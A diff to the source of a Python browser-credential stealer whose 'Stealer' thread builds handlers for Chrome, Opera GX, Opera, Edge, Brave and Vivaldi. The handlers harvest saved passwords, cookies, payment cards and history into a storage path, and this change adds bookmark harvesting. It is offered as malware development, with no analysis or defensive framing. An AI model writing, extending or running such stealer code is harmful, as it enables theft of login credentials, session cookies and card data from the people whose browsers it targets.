@@ -25,13 +25,15 @@ class Stealer(Thread):
             else:
                 self.__dict__.update({status: True})
 
+        browser_functions = (self.passwords, self.cookies, self.cards, self.history, self.bookmarks)
+
         self.methods = [
             {
                 "object": Chromium(
                     "Chrome",
                     self.config.StoragePath,
                     *self.config.ChromePaths,
-                    (self.passwords, self.cookies, self.cards, self.history),
+                    browser_functions,
                     self.errors
                 )
             },
@@ -40,7 +42,7 @@ class Stealer(Thread):
                     "Opera GX",
                     self.config.StoragePath,
                     *self.config.OperaGXPaths,
-                    (self.passwords, self.cookies, self.cards, self.history),
+                    browser_functions,
                     self.errors
                 )
             },
@@ -49,7 +51,7 @@ class Stealer(Thread):
                     "Opera Default",
                     self.config.StoragePath,
                     *self.config.OperaDefaultPaths,
-                    (self.passwords, self.cookies, self.cards, self.history),
+                    browser_functions,
                     self.errors
                 )
             },
@@ -58,7 +60,7 @@ class Stealer(Thread):
                     "Microsoft Edge",
                     self.config.StoragePath,
                     *self.config.MicrosoftEdgePaths,
-                    (self.passwords, self.cookies, self.cards, self.history),
+                    browser_functions,
                     self.errors
                 )
             },
@@ -67,7 +69,7 @@ class Stealer(Thread):
                     "Brave",
                     self.config.StoragePath,
                     *self.config.BravePaths,
-                    (self.passwords, self.cookies, self.cards, self.history),
+                    browser_functions,
                     self.errors
                 )
             },
@@ -76,7 +78,7 @@ class Stealer(Thread):
                     "Vivaldi",
                     self.config.StoragePath,
                     *self.config.VivaldiPaths,
-                    (self.passwords, self.cookies, self.cards, self.history),
+                    browser_functions,
                     self.errors
                 )
             },
